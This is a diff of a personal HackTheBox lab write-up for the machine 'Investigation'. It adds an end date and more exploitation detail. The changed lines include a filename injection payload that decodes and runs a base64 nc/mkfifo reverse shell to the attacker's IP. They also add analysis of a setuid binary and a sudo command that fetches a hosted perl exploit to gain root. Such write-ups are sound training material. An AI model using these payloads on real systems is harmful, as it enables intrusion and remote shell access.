@@ -1,5 +1,6 @@
 # HTB - Investigation
 # Start: 28/02/2023
+# End: 20/03/2023
 # IP 10.10.11.197
 
 ## Info gathering
@@ -91,11 +92,13 @@ to confirm the vulnerability was exploitable i used `filename="echo 'curl 10.10.
 if we add any other pipes to the command e.g. > the command will fail to run, however we can pass a b64 encoded command, pipe it to the base64 -d command to decode and pipe the result into bash to run it, which avoids the other pipes breaking it.
 
 ```
-curl 10.10.14.58:8000/?d=$(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.58 4444 >/tmp/f)
+curl 10.10.14.110:8000/?d=$(
+  rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.110 4444 >/tmp/f
+  )
 b64 encoded:
-Y3VybCAxMC4xMC4xNC43MDo4MDAwLz9kPSQocm0gLWYgL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuNzAgNDQ0NCA+L3RtcC9mKQ==
+Y3VybCAxMC4xMC4xNC4xMTA6ODAwMC8/ZD0kKHJtIC1mIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjEwLjE0LjExMCA0NDQ0ID4vdG1wL2Yp
 
-filename="echo 'Y3VybCAxMC4xMC4xNC41ODo4MDAwLz9kPSQocm0gLWYgL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuNTggNDQ0NCA+L3RtcC9mKQ==' | base64 -d | bash |"
+filename="echo 'Y3VybCAxMC4xMC4xNC4xMTA6ODAwMC8/ZD0kKHJtIC1mIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjEwLjE0LjExMCA0NDQ0ID4vdG1wL2Yp' | base64 -d | bash |"
 
 ```
 
@@ -208,5 +211,30 @@ lea     rdi, s          ; "Exiting... "
 
 ```
 
-Hope that's understandable :| So what we should see given correct input up to this point is `Running...`, the program then goes on to open a file to write and begins the curl process, so its safe to assume we're curling a file to disk and from the dissassembled view we can confirm its using the second argument as the source `  curl_easy_setopt(v5, 10002LL, argv[1]);` , which means we may be able to download files hosted by us, no execution yet but we haven't finished yet!
-Then if the program fails the process exits, but if it doesn't fail, we move on!
+Hope that's understandable :| So what we should see given correct input up to this point is `Running...`, the program then goes on to open a file to write and begins the curl process, so its safe to assume we're curling a file to disk and from the dissassembled view we can confirm its using the second argument as the source `  curl_easy_setopt(v5, 10002LL, argv[1]);` and saves them as the string mentioned earlier `  stream = fopen(argv[2], "wb");` , which means we may be able to download files hosted by us, no execution yet but we haven't finished yet!
+Then if the program fails the process exits, but if it doesn't fail, we move on! This one is bigger than the last sorry again!
+```
+snprintf(s, v6 + 1, "%s", argv[2]);
+...
+v7 = snprintf(0LL, 0LL, "perl ./%s", s);
+command = (char *)malloc(v7 + 1);
+snprintf(command, v7 + 1, "perl ./%s", s);
+...
+setuid(0);
+system(command);
+system("rm -f ./lDnxUysaQn");
+```
+Ha tricked you, just looking at the psuedocode is good and this seems like a winner here! The code takes that string (or the filename of our hosted file) and runs it in perl! as root! so we just need to write a perl reverse shell and host it for the victim...
+
+the full command will be `binary http://10.10.14.110:8000/exploit.pl lDnxUysaQn`
+```
+binary http://10.10.14.110:8000/exploit.pl lDnxUysaQn
+bash: line 2: /usr/bin/binary: Permission denied
+```
+my mistake! sudo!!!
+```
+sudo binary http://10.10.14.110:8000/exploit.pl lDnxUysaQn
+whoami
+root
+```
+AND WE HAVE IT! box complete :)
